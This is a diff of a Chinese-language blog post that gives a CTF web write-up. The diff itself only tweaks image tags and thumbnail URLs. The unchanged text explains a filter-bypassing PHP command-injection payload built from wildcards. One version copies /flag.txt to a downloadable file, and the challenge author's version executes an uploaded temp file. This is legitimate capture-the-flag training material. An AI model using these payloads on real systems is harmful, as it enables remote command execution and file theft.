@@ -242,21 +242,21 @@
           </header>
         
         <div class="entry-content">
-          <p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214135958.png" alt="QQ截图20200214135958"></p>
+          <p><img data-action="zoom" src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ截图20200214135958.png" alt="QQ截图20200214135958"></p>
 <p>直接看源代码</p>
 <a id="more"></a>
 
-<p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214140007.png" alt="QQ截图20200214140007"></p>
+<p><img data-action="zoom" src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ截图20200214140007.png" alt="QQ截图20200214140007"></p>
 <p>发现hint：?cmd=</p>
 <p>可以推测大概是构造payload</p>
 <p>接下来访问url/?cmd</p>
-<p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214140024.png" alt="QQ截图20200214140024"></p>
+<p><img data-action="zoom" src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ截图20200214140024.png" alt="QQ截图20200214140024"></p>
 <p>通过观察发现过滤了不少符号，键盘上能用的没几个了……害</p>
 <p>根据大佬给的提示，我们用仅存的几个符号构造payload</p>
 <pre><code>?cmd=?&gt;&lt;?=`/???/?p /???????? p.ppp`;?&gt;</code></pre><p>功能相当于是</p>
 <pre><code>?cmd=?&gt;&lt;?=`/bin/cp /flag.txt p.ppp`;?&gt;</code></pre><p>用cp命令，将flag.txt复制到p.ppp</p>
 <p>接下来访问url/p.ppp，下载下来得到flag</p>
-<p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214140151.png" alt="QQ截图20200214140151"></p>
+<p><img data-action="zoom" src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ截图20200214140151.png" alt="QQ截图20200214140151"></p>
 <p>关于构造的payload可以解释下?&gt;是关闭php标签 &lt;?=是使用php短标签来返回结果`是执行命令</p>
 <p>而出题人给出的payload是</p>
 <pre><code>?cmd=?&gt;&lt;?=`/??p/p?p??????`;?&gt;</code></pre><p>是匹配到/tmp/phpXXXXXX文件，匹配到之后执行</p>
@@ -288,7 +288,7 @@
               <div class="background">
 <!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/b3e8dae89b950b940dc0edd1e8cc0566.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/19313b0d62b27c8ba022f60fbfedd5ee.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Previous Post</span>
@@ -307,7 +307,7 @@
             <a href="/2020/02/01/Hgame-Week1-web/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/6f005cbc1865ff1b706aba57347988ab.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/783bf161f47b32882f0e962fd4064de7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
